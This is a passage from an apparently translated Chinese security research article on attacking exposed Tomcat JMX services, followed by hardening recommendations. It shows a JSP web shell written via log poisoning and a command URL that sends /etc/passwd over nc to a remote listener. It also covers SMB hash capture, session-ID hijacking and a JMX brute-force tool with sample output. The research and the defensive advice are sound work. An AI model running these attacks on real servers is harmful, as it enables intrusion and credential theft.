这意味着，作为一个攻击者，我们滥用它来在Tomcat提供网络服务的目录中创建一个Java Servlet
Page（JSP）文件。在这里我们的目标创建包含JSP指令的文件来在服务器上面执行命令。
为了实现这个，我们首先需要的是使用在URL中包含有效的JSP代码的请求来破环Tomcat访问日志。
例如，使用Burp Suite Repeater来发送下面的请求。注意在这个例子中，我们测试的Tomcat运行在80/tcp端口：
图13 – 发送的请求
现在我们需要的是找到一个可靠的路径来存放我们的使用rotate函数的JSP文件。关于这个我们能利用JConsole界面中的一些信息。
VM的Summary选项卡能提供一些关于catalina.base属性的信息。这个选项卡包含一个节（在窗口底部），显示了Java VM的参数。
例子显示如下：
图14 – catalina.base文件夹
Catalina.base目录应该返回一个webapps文件夹，其中是Tomcat提供的各种网络服务。
部署在服务器上的网络应用可以在MBeans选项卡中看到。
下面的截图是Tomcat服务器默认的应用的例子：
图15 – Tomcat上默认的应用
将cataline.base目录的信息和Tomcat上的应用列表放在一起，找到存储我们JSP文件的目录还是可能的。
例如，一个test.jsp文件存储在/docs文件夹中：
    /opt/bitnami/apache-tomcat/webapps/docs/test.jsp
在这里，上面的路径可以和rotate函数一起使用：
图16 – test.jsp文件被创建
我们能打开浏览器并运行一个命令。在下面的截图中一个命令被执行，用来把/etc/passwd的内容粘帖到nc客户端中，继而连接一个远程监听器：
图17 – 远程服务器上面的数据
作为参考，执行命令的URL显示如下：
    http://192.168.11.141/docs/test.jsp?cmd=sh%20-c%20$@|sh%20.%20echo%20/bin/cat%20/etc/passwd%20|%20nc%20192.168.11.136%208080
这包括一些调整，允许使用管道将输出从一个命令重定向到另一个命令。
如果需要，目前为止的web shell也可以用来执行wget命令，并从远程机器上面下载一个更多功能的JSP shell。
**捕获SMB challenge-responses hashes**
正如已经讨论的，如果你的Tomcat服务器在Windows上面运行，意味着通过JSP shell执行的命令和通过rotate函数创建的命令将以最高权限运行。
然而，有时可能出现不正确的情况，且服务器运行在域账户。如果那种情况，捕获SMB challenge-responses和破解他们是可能的。Rotate函数也在这里使用。
为了测试攻击场景，Kali虚拟机可以用来启动Metasploit SMB capture auxiliary module。
使用JConsole执行JMX连接，并且使用下面的参数使用rotate函数：
    \192.168.11.136test
在这种情况，上面的IP地址是Kali虚拟机。下面的截图确认了Tomcat向远程IP发送了一个请求，能够3次捕获SMB challenge：
图18 – 捕获的SMB challenge response
**通过创建其他文件类型来进行client-side攻击**
注意，rotate函数也能用来创建敏感文件（如HTML文件），并且在网络应用中存储他们，以便执行跨站脚本攻击。
这个涉及到，重复上述步骤，使用可靠的HTML代码污染日志文件，然后在Tomcat网络应用程序目录中存储一个HTML文件。
图19 – html文件
**0x06 抓取网络应用的用户的session ID**
另外的Tomcat JMX操作能被攻击者利用来劫持Tomcat网络应用的用户的会话，lisrSessionIds()在下面的节点显示：
    Catalina->Manager->[ApplicationName]->Operations->listSessionIds()
这个操作通常可用于Tomcat上部署的每个网络应用中，且如名称所示，能返回连接应用的用户的所有的JSESSIONID。
例如，下面的截图显示了连接管理器应用的用户的session ID：
通过Tomcat JMX服务可用的操作之一将允许检索JSESSIONID cookie值，因此可能允许攻击者通过劫持他们的会话来假冒另一个用户。
注意，由于需要该帐户的有效用户名和密码，因此无法利用此问题访问管理器应用程序。然而，部署在服务器上的其他应用程序（例如支持基于JSESSIONID
cookie的认证的应用程序）会受到影响。
能够运行listSessionIds()数的攻击者将能够劫持另一个用户的会话。
注意，listSessionIds()是另一个操作，它只对具有写入权限的JMX用户可用。
如果JMX服务器配置为允许未经认证的访问，那么它仍然可以使用。
**0x07 暴力破解进入Tomcat JMX**
当Tomcat JMX服务配置为启用认证并且使用强密码时，仍有可能获得未经授权的访问。
实际上，为此服务实现的认证过程在登录失败后不会锁定帐户，因此容易受到暴力密码破解攻击。
PoC工具（jmxbf）已经由作者开发来演示这个。
使用例子如下：
    $>Usage: 
    java -jar jmxbf.jar
    -h,--host  The JMX server IP address.
     -p,--port  The JMX server listening port.
     -pf,--passwords-file  File including the passwords, one per line.
     -uf,--usernames-file  File including the usernames, one per line.
Example:
    $>java –jar jmxbf.jar –h 192.168.20.1 –p 1099 –uf usernames.txt –pf passwords.txt
一些例子输出如下：
    $>java –jar jmxbf.jar –h 192.168.20.1 –p 1099 –uf usernames.txt –pf passwords.txt
    Auth failed!!!
    Auth failed!!!
    Auth failed!!!
    . . .
    Auth failed!!!
    Auth failed!!!
    ###SUCCESS### - We got a valid connection for: control:supersecretpwd
    Found some valid credentials - continuing brute force
    ....
    ###SUCCESS### - We got a valid connection for: monitor:monitor
    Found some valid credentials - continuing brute force
    Auth failed!!!
    Auth failed!!!
    Auth failed!!!
    Auth failed!!!
    . . .
    Auth failed!!!
    Auth failed!!!
    Auth failed!!!
    The following valid credentials were found:
    control:supersecretpwd
    monitor:monitor
这个工具通过github可以下载到： 。
**0x08 其他问题？**
正如已经提到的，MBeans操作的大列表和属性能提供给连接Tomcat
JMX服务的用户使用。可能还有其他函数，可以使用与上面讨论的rotate函数问题所示的类似的方式。
深入研究才能确定。
如果由于强大的认证措施让你无法访问Tomcat JMX控制台，则仍然有潜在的方法来破坏服务器。
Tomcat最近修补了两个与Java反序列化相关的漏洞，如果暴露了JMX服务器，可以利用这些漏洞：
本文不讨论这些漏洞的细节，但是却可以说如果你的Tomcat运行在老版本的Java系统中，是可能通过发送特定的包到JMX服务器来实现RCE。
进一步研究后再发布新文。
**0x09 建议**
有很多可以实现的建议，来保护有本文讨论的问题的Tomcat服务器。
首先，建议对JMX服务的访问使用防火墙。只有列入白名单的IP地址才能连接。
然而，应该始终启用强密码的认证。下面是在Windows使用setenv.bat启动认证的例子：
    SET JAVA_HOME={replace with full path to Java JDK}
    SET JRE_HOME=%JAVA_HOME%
    SET JAVA_OPTS=%JAVA_OPTS% -Xms256m -Xmx512m -XX:MaxPermSize=256m -server
    SET CATALINA_OPTS=-Dcom.sun.management.jmxremote 
    -Dcom.sun.management.jmxremote.port=1099 
    -Dcom.sun.management.jmxremote.rmi.port=1099 
    -Dcom.sun.management.jmxremote.ssl=true 
    -Dcom.sun.management.jmxremote.local.only=false 
    -Djava.rmi.server.hostname={replace with Tomcat server IP address}
    SET CATALINA_OPTS=%CATALINA_OPTS% 
    -Dcom.sun.management.jmxremote.authenticate=true 
    -Dcom.sun.management.jmxremote.password.file=%CATALINA_BASE%/conf/jmxremote.password 
    -Dcom.sun.management.jmxremote.access.file=%CATALINA_BASE%/conf/jmxremote.access
下面是Linux下面使用setenv.sh的例子：
    JAVA_HOME={replace with full path to Java JDK}
    JRE_HOME=$JAVA_HOME
    JAVA_OPTS="-Djava.awt.headless=true -XX:+UseG1GC -Dfile.encoding=UTF-8 $JAVA_OPTS "
    JAVA_OPTS="-XX:MaxPermSize=256M -Xms256M -Xmx512M $JAVA_OPTS " 
    CATALINA_OPTS="-Dcom.sun.management.jmxremote 
    -Dcom.sun.management.jmxremote.port=1099 
    -Dcom.sun.management.jmxremote.rmi.port=1099 
    -Dcom.sun.management.jmxremote.ssl=true 
    -Dcom.sun.management.jmxremote.local.only=false 
    -Djava.rmi.server.hostname={replace with Tomcat server IP address} 
    -Dcom.sun.management.jmxremote.authenticate=true 
    -Dcom.sun.management.jmxremote.password.file=../conf/jmxremote.password 
    -Dcom.sun.management.jmxremote.access.file=../conf/jmxremote.access" 
    export JAVA_HOME
    export JRE_HOME
    export JAVA_OPTS
    export CATALINA_OPTS
SSL也应该开启，以保护认证过程中凭据嗅探攻击。
注意，在上述所有的配置中，jmxremote.ssl变量设为true。
然而，没有包括正确启用SSL其他的一些变量。需要的其他配置步骤在这里不再详述。
下面的URL包含了这个任务的参考信息：
强烈推荐为只读和读写用户在jmxremote.password文件中设置高强度密码保护。这些应该与Tomcat管理器不同。
并且，考虑为所有用户选择不常用的用户名。
另外，只有Tomcat用户才被允许读取jmxremote.password文件。如果检测到这个文件的读权限太宽松，Tomcat将不会启动。
下面的命令能被用来在Windows上面设置这些权限：
    cacls jmxremote.password /P [username]:R
尽管JMX访问等同于admin/root访问，如果一个人能够以只读用户身份访问JMX服务，那么仍然可能看到Tomcat管理器用户名和密码。
的确，只读用户将不被允许运行任何JMX操作，但他们仍然能够访问一个敏感的信息，在大多数情况下，将导致Tomcat服务器的破环。
关于rotate函数的问题，作者认为应该严格的控制，以避免Tomcat JMX服务器在服务器上可用的任何文件夹上创建具有任何扩展名的日志文件。
通过这个函数创建的日志文件只能在Tomcat日志文件夹中创建，并且无法使用URL访问。
最后，考虑在系统上存储一个哈希版本的Tomcat管理器密码（因为这个哈希将在JMX属性中可见）而不是纯文本版本。
注意，这是我们从Tomcat收到的一个建议，同时讨论了JMX只读用户能够读取管理器的密码的问题。然而，这种情况下如果用户名还是明文，攻击者可以使用离线密码破解工具破解密码。
下面的URL包含了存储哈希版本密码的一些参考：
下面是digest工具的使用例子：
    digest.bat -s 0 -i 1 themanagersecretpassword
将输出明文和加密的凭据：
    themanagersecretpassword:42052cec2459a6b4c383f2c43698d0528fe3f39756f8524763fc9e2997e77ebf1f1ba9bc0926b7395e32bb796e4ec0c1045e96c15c1edb510c2e295a5c11b095
注意，在上面的例子中，-s和-i参数分别用于设置salt的长度和迭代次数。
Digest工具还接受-a参数，来指定哈希算法。
根据Tomcat的推荐，当不使用-a参数，则默认使用SHA-512。
另外，应该注意不带-s和-i参数使用digest，将返回{salt}${iterations}${digest}格式的输出，例子如下：
    >digest.bat themanagersecretpassword
    themanagersecretpassword:92cd45d5db0f5794c794bf4fb0cc975347978d53673ec3c946a28c199c209995$1$a27648ca5671b33692ebb95a80720903dfd50b13da649b1d703ffc0260b2194ddec21616528bf4f6a99fb6b8fa724c6c518c2c45125b135b82c2ec16b060cb2f
上述的例子，关于salt的长度（字节）和迭代次数，使用默认值，
虽然作者写作是不知道，但是下面的工具在2014年由Jeremy
Mousset创建，覆盖了本文讨论的一部分内容，且不涉及JConsole：https://github.com/jmxploit/jmxploit